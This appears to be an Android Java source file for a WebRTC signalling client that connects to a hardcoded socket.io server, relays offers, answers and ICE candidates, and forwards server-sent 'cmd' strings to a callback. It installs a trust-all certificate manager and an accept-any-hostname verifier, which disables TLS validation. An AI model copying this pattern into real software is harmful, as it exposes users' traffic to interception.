package android.sysmaster;

import android.annotation.SuppressLint;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.IceCandidate;
import org.webrtc.SessionDescription;

import java.net.URISyntaxException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;
import java.util.Arrays;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import io.socket.client.IO;
import io.socket.client.Socket;

/**
 * Webrtc_Step3
 * Created by vivek-3102 on 11/03/17.
 */

class SignallingClient {
    private static SignallingClient instance;
    private String roomName = null;
    private Socket socket;
    boolean isChannelReady = false;
    boolean isInitiator = true;
    boolean isStarted = false;
    private SignalingInterface callback;

    //This piece of code should not go into production!!
    //This will help in cases where the node server is running in non-https server and you want to ignore the warnings
    @SuppressLint("TrustAllX509TrustManager")
    private final TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[]{};
        }

        public void checkClientTrusted(X509Certificate[] chain,
                                       String authType) {
        }

        public void checkServerTrusted(X509Certificate[] chain,
                                       String authType) {
        }
    }};

    public static SignallingClient getInstance() {
        if (instance == null) {
            instance = new SignallingClient();
        }
        //if (instance.roomName == null) {
            //set the room name here

        //    instance.roomName = android.os.Build.MANUFACTURER + "_" + android.os.Build.MODEL ;
        //}
        return instance;
    }

    public void setCallback(SignalingInterface signalingInterface){
        this.callback = signalingInterface;
    }
    public void init(SignalingInterface signalingInterface , String roomName) {
        this.roomName = roomName;
        this.callback = signalingInterface;
        try {
            SSLContext sslcontext = SSLContext.getInstance("TLS");
            sslcontext.init(null, trustAllCerts, null);
            IO.setDefaultHostnameVerifier((hostname, session) -> true);
            IO.setDefaultSSLContext(sslcontext);
            //set the socket.io url here
            socket = IO.socket("https://signaling.bestchoice.live");
            socket.connect();

            if (!roomName.isEmpty()) {
                createOrJoinRoom(roomName);
            }



            //room created event.
            socket.on("created", args -> {
                callback.onCreatedRoom();
            });

            //on create room .
            socket.on("createRoom", args -> {
                //callback.onCreateRoom();
                //createOrJoinRoom(this.roomName);
            });

            //room is full event
            socket.on("full", args -> Log.d("SignallingClient", "full call() called with: args = [" + Arrays.toString(args) + "]"));

            // cmd
            socket.on("cmd", args -> callback.onCmd((String) args[0]));

            socket.on("getRooms", args -> callback.getRooms((JSONObject) args[0]));

            //messages - SDP and ICE candidates are transferred through this
            socket.on("message", args -> {
                if (args[0] instanceof String) {
                    String data = (String) args[0];
                    // you can compare massage string , and call function

                } else if (args[0] instanceof JSONObject) {
                    try {

                        JSONObject data = (JSONObject) args[0];
                        String type = data.getString("type");
                        if (type.equalsIgnoreCase("offer")) {
                            callback.onOfferReceived(data);
                        } else if (type.equalsIgnoreCase("answer") ) {
                            callback.onAnswerReceived(data);
                        } else if (type.equalsIgnoreCase("candidate") ) {
                            callback.onIceCandidateReceived(data);
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            });
        } catch (URISyntaxException | NoSuchAlgorithmException | KeyManagementException e) {
            e.printStackTrace();
        }
    }

    public void createOrJoinRoom(String roomName) {
        socket.emit("create or join", roomName);
    }

    //public void emitMessage(String message) {
    //    socket.emit("message", message);
    //}

    public void emitMessage(SessionDescription message) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("type", message.type.canonicalForm());
            obj.put("sdp", message.description);
            socket.emit("message", obj);
            } catch (JSONException e) {
            e.printStackTrace();
        }
    }


    public void emitIceCandidate(IceCandidate iceCandidate) {
        try {
            JSONObject object = new JSONObject();
            object.put("type", "candidate");
            object.put("label", iceCandidate.sdpMLineIndex);
            object.put("id", iceCandidate.sdpMid);
            object.put("candidate", iceCandidate.sdp);
            socket.emit("message", object);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    // send cmd
    public void cmd(String cmd){
        socket.emit("cmd", cmd);
    }

    public void createRoom(){
        socket.emit("createRoom");
    }

    public void getRooms(){
        socket.emit("getRooms");
    }

    public void leaveRoom(String roomName){
        socket.emit("leaveRoom", roomName);
    }
    public void close() {
        socket.disconnect();
        socket.close();
    }


    interface SignalingInterface {

        void onOfferReceived(JSONObject data);

        void onAnswerReceived(JSONObject data);

        void onIceCandidateReceived(JSONObject data);

        void onCreatedRoom();

       // void onCreateRoom();

        void onCmd(String cmd);

        void getRooms(JSONObject rooms);
    }
}
